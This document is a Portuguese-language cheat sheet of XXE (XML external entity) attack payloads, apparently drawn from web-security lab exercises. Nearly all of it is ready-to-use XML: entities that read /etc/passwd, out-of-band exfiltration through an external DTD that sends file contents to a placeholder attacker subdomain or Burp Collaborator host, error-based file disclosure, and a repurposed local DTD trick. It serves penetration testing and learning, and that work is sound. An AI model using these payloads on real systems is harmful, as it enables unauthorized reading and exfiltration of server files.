# XXE Attacks

Explorando XXE para recuperar aquivos do sistema:

```xml
﻿<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Explorando XXE com interação OOB para ataques do tipo *bind*

```xml
﻿<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.com"> ]> 
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Explorando XXE com interação OOB com XML *parameters entities*

```xml
﻿<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]> 
<stockCheck><productId>1</productId></stockCheck>
```

DTD URL

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```

Esta técnica pode no funcionar com alguns arquivos do sistema, principalmente os arquivos que contem LF. Como prova de conceito o arquivo ```/etc/passwd``` pode ser substituido pelo ```/etc/hostname```

Explorando XXE através de mensagens de erros:

Arquivo armazenado em servidor sobre controle:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

Requisição XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]> 
<stockCheck><productId>1</productId></stockCheck>
```

Explorando XXE do tipo bind por reposicionamento de um arquivo DTD local e por mensagem de erro:

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```
